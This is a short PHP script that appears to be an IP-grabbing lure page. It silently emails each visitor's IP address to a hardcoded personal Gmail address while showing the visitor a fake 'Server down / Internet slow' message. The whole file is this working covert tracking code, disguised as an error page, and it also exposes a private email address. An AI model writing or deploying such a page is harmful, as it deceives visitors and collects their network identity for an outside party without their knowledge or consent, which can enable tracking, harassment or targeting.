<?php
$ip = $_SERVER['REMOTE_ADDR'];
$newip = $ip;

$email = "parikshitshakla2k16@gmail.com";
$subject = "From HelpX";
$latestip = $newip;
$header = "From: helpX";
$retval = mail($email,$subject,$latestip,$header); 


?>
<center><h1>Server down</h1></br>
<h1>OR</h1></br>
<h1>Internet slow</h1>